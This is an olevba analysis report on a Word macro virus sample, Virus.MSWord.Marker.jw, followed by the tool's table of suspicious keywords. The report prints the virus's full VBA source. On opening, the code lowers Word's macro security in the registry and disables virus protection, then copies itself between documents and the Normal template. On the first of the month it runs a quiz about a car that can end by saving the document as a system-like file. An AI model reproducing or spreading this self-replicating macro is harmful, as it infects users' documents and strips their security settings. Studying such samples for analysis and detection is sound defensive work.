olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.jw
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.jw - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim DI As Boolean, TI As Boolean, d As Object, t As Object, Src As String, r As String
Private Sub Document_Close()
On Error Resume Next
  Call Document_Open
  If DI And Not (TI) Then
    Src = d.CodeModule.Lines(1, d.CodeModule.CountOfLines)
    t.CodeModule.AddFromString Src
    NormalTemplate.Save
  ElseIf TI And Not (DI) Then
If Day(Now()) = 1 Then
 Do
 r = UCase(InputBox("长安之星车长多少米?" & Chr(13) & Chr(13) _
 & "A.3米4  B.3米5  C.3米55  D.3米7" & Chr(13) & Chr(13) _
 & "要好好思考哟!", "紧急提问"))
 Loop Until r <> ""
 If r = "B" Then
   MsgBox "好棒哟!"
   GoTo 10
 Else
   MsgBox "唉!再给你一次机会."
    Do
     r = UCase(InputBox("长安之星FBA是什么型?" & Chr(13) & Chr(13) _
     & "A.标准型  B.普通型  C.豪华型" & Chr(13) & Chr(13) _
     & "想好了再回答!", "紧急提问"))
    Loop Until r <> ""
      If r = "C" Then
        MsgBox "谢谢你的支持!"
        GoTo 10
      Else
        MsgBox "笨蛋!给你最后一次机会."
          Do
           r = UCase(InputBox("安全气囊是干什么用的?" & Chr(13) & Chr(13) _
           & "A.防止撞车  B.防止侧滑  C.撞车时保护驾驶员" & Chr(13) & Chr(13) _
           & "这是最后一次机会哟!", "紧急提问"))
          Loop Until r <> ""
           If r = "C" Then
             MsgBox "总算答对了!"
             GoTo 10
           Else
             MsgBox "看来你还需要对长安之星多加了解..."
             ActiveDocument.SaveAs "c:\lzc.vxd"
             ActiveDocument.Close
             Exit Sub
           End If
      End If
 End If
End If
10:
    Src = t.CodeModule.Lines(1, t.CodeModule.CountOfLines)
    d.CodeModule.AddFromString Src
    ActiveDocument.Save
  End If
End Sub

Private Sub Document_Open()
On Error Resume Next
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  Options.ConfirmConversions = False: Options.VirusProtection = False: Options.SaveNormalPrompt = False

Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
DI = d.CodeModule.Find("长安公司汽研所 常识课a", 1, 1, 1000, 1000)
TI = t.CodeModule.Find("长安公司汽研所 常识课a", 1, 1, 1000, 1000)
  If DI And Not (TI) Then
    t.CodeModule.DeleteLines 1, t.CodeModule.CountOfLines
  ElseIf TI And Not (DI) Then
    d.CodeModule.DeleteLines 1, d.CodeModule.CountOfLines
  End If
End Sub




























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

